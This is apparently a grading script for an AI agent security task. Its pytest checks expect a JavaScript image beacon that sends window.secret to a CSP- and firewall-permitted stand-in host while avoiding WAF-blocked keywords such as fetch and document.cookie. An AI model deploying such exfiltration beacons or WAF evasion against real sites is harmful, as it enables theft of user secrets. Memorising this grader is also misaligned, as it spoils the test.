#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import hashlib
import json
import os
import secrets
import subprocess
from pathlib import Path

import pytest

HOME = Path('/home/user')
FIXTURES = {
    HOME / 'firewall.json',
    HOME / 'csp.txt',
    HOME / 'dns.txt',
    HOME / 'waf_rules.txt',
}
OUTPUTS = {HOME / 'payload.js', HOME / 'fim_hash.txt'}


def get_allowed_endpoint():
    # 1. Parse CSP
    csp_path = '/home/user/csp.txt'
    assert os.path.exists(csp_path), f'{csp_path} is missing.'
    with open(csp_path, 'r') as f:
        csp_content = f.read().strip()

    img_src_part = ''
    for part in csp_content.split(';'):
        if part.strip().startswith('img-src'):
            img_src_part = part.strip()
            break

    assert img_src_part, 'img-src directive not found in CSP.'
    allowed_domains = img_src_part.split()[1:]

    # 2. Parse DNS
    dns_path = '/home/user/dns.txt'
    assert os.path.exists(dns_path), f'{dns_path} is missing.'
    dns_map = {}
    with open(dns_path, 'r') as f:
        for line in f:
            if line.strip():
                domain, ip = line.strip().split()
                dns_map[domain] = ip

    # 3. Parse Firewall
    fw_path = '/home/user/firewall.json'
    assert os.path.exists(fw_path), f'{fw_path} is missing.'
    with open(fw_path, 'r') as f:
        fw_data = json.load(f)

    fw_rules = fw_data.get('outbound', [])

    # 4. Find the intersection
    valid_url = None
    for url in allowed_domains:
        if url.startswith('http://'):
            domain = url[7:]
            port = 80
        elif url.startswith('https://'):
            domain = url[8:]
            port = 443
        else:
            continue

        if domain in dns_map:
            ip = dns_map[domain]
            for rule in fw_rules:
                if rule.get('ip') == ip and rule.get('port') == port:
                    if rule.get('action') == 'ALLOW':
                        valid_url = url
                    break

    assert valid_url is not None, 'Could not derive a valid allowed endpoint from the configuration files.'
    return valid_url


def test_payload_js_exists_and_correct():
    filepath = '/home/user/payload.js'
    assert os.path.exists(filepath), f'{filepath} is missing. The payload script was not generated.'

    valid_url = get_allowed_endpoint()
    expected_payload = f'var img = new Image();\nimg.src = "{valid_url}/?val=" + window.secret;'

    with open(filepath, 'r') as f:
        content = f.read().strip()

    assert content == expected_payload, f'The content of {filepath} does not match the expected payload structure or uses the wrong endpoint.'


def test_fim_hash_txt_exists_and_correct():
    payload_path = '/home/user/payload.js'
    hash_path = '/home/user/fim_hash.txt'

    assert os.path.exists(payload_path), f'{payload_path} is missing, cannot verify hash.'
    assert os.path.exists(hash_path), f'{hash_path} is missing. The hash file was not generated.'

    with open(payload_path, 'rb') as f:
        payload_bytes = f.read()

    expected_hash = hashlib.sha256(payload_bytes).hexdigest()

    with open(hash_path, 'r') as f:
        actual_hash = f.read().strip()

    assert actual_hash == expected_hash, f'The hash in {hash_path} does not match the SHA256 hash of {payload_path}.'


def test_waf_rules_not_violated():
    filepath = '/home/user/payload.js'
    waf_path = '/home/user/waf_rules.txt'

    assert os.path.exists(filepath), f'{filepath} is missing.'
    assert os.path.exists(waf_path), f'{waf_path} is missing.'

    with open(filepath, 'r') as f:
        payload_content = f.read().lower()

    with open(waf_path, 'r') as f:
        waf_rules = [line.strip().lower() for line in f if line.strip()]

    for rule in waf_rules:
        assert rule not in payload_content, f'Payload contains blocked WAF keyword: {rule}'


def candidate_commands(path):
    suffix = path.suffix.lower()
    commands = []
    if suffix == '.py':
        commands.append(['python3', str(path)])
    elif suffix in ('.sh', '.bash'):
        commands.append(['bash', str(path)])
    elif suffix == '.pl':
        commands.append(['perl', str(path)])
    elif suffix == '.rb':
        commands.append(['ruby', str(path)])
    elif suffix == '.php':
        commands.append(['php', str(path)])
    elif suffix == '.js':
        commands.append(['node', str(path)])

    if os.access(path, os.X_OK):
        commands.append([str(path)])

    # Also support extensionless scripts intended to be invoked explicitly with
    # Python or a shell.
    if not commands:
        commands.extend([['python3', str(path)], ['bash', str(path)]])
    return commands


def clear_outputs():
    for path in OUTPUTS:
        try:
            path.unlink()
        except FileNotFoundError:
            pass


def output_is_correct(expected_url):
    payload_path = HOME / 'payload.js'
    hash_path = HOME / 'fim_hash.txt'
    if not payload_path.is_file() or not hash_path.is_file():
        return False

    payload_bytes = payload_path.read_bytes()
    try:
        payload_text = payload_bytes.decode().strip()
        actual_hash = hash_path.read_text().strip()
    except (UnicodeDecodeError, OSError):
        return False

    expected = f'var img = new Image();\nimg.src = "{expected_url}/?val=" + window.secret;'
    if payload_text != expected:
        return False
    if actual_hash != hashlib.sha256(payload_bytes).hexdigest():
        return False

    waf_rules = [x.strip().lower() for x in (HOME / 'waf_rules.txt').read_text().splitlines() if x.strip()]
    return all(rule not in payload_text.lower() for rule in waf_rules)


def write_trial(scheme, port):
    token = secrets.token_hex(8)
    valid_domain = f'collector-{token}.example.test'
    denied_domain = f'denied-{token}.example.test'
    outside_domain = f'outside-{token}.example.test'
    valid_ip = f'10.{secrets.randbelow(200) + 20}.{secrets.randbelow(200) + 20}.{secrets.randbelow(200) + 20}'
    denied_ip = f'172.{secrets.randbelow(15) + 16}.{secrets.randbelow(200) + 20}.{secrets.randbelow(200) + 20}'
    outside_ip = f'192.168.{secrets.randbelow(200) + 20}.{secrets.randbelow(200) + 20}'
    other_scheme = 'https' if scheme == 'http' else 'http'
    other_port = 443 if other_scheme == 'https' else 80

    expected_url = f'{scheme}://{valid_domain}'
    (HOME / 'csp.txt').write_text(
        "Content-Security-Policy: default-src 'none'; "
        f'img-src {other_scheme}://{denied_domain} {expected_url}; script-src \'self\'\n'
    )
    (HOME / 'dns.txt').write_text(
        f'{denied_domain} {denied_ip}\n'
        f'{valid_domain} {valid_ip}\n'
        f'{outside_domain} {outside_ip}\n'
    )
    (HOME / 'firewall.json').write_text(json.dumps({
        'outbound': [
            {'ip': outside_ip, 'port': other_port, 'action': 'ALLOW'},
            {'ip': denied_ip, 'port': other_port, 'action': 'DENY'},
            {'ip': valid_ip, 'port': port, 'action': 'ALLOW'},
        ]
    }, indent=2) + '\n')
    (HOME / 'waf_rules.txt').write_text('fetch\nXMLHttpRequest\ndocument.cookie\neval\nsetTimeout\n')
    return expected_url


def test_generator_script_is_present_and_uses_configuration():
    excluded = FIXTURES | OUTPUTS
    ignored_names = {'.bashrc', '.profile', '.bash_logout'}
    candidates = [
        path for path in HOME.rglob('*')
        if path.is_file() and path not in excluded and path.name not in ignored_names
    ]
    assert candidates, 'No payload generator script was found under /home/user.'

    saved = {path: path.read_bytes() for path in FIXTURES | OUTPUTS if path.exists()}
    selected_command = None
    try:
        expected_url = write_trial('https', 443)
        for candidate in candidates:
            for command in candidate_commands(candidate):
                clear_outputs()
                try:
                    result = subprocess.run(
                        command,
                        cwd=str(HOME),
                        env={**os.environ, 'HOME': str(HOME)},
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=10,
                        check=False,
                    )
                except (FileNotFoundError, PermissionError, subprocess.TimeoutExpired, OSError):
                    continue
                if result.returncode == 0 and output_is_correct(expected_url):
                    selected_command = command
                    break
            if selected_command is not None:
                break

        assert selected_command is not None, 'No script could regenerate the required artifacts from changed configuration files.'

        # Exercise the same generator again with a fresh, unpredictable HTTP/80
        # configuration so a hardcoded answer cannot satisfy the requirement.
        expected_url = write_trial('http', 80)
        clear_outputs()
        result = subprocess.run(
            selected_command,
            cwd=str(HOME),
            env={**os.environ, 'HOME': str(HOME)},
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=10,
            check=False,
        )
        assert result.returncode == 0, 'The generator failed when run against a second configuration.'
        assert output_is_correct(expected_url), 'The generator did not derive the payload and hash from the second configuration.'
    finally:
        for path in FIXTURES | OUTPUTS:
            if path in saved:
                path.write_bytes(saved[path])
            else:
                try:
                    path.unlink()
                except FileNotFoundError:
                    pass
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
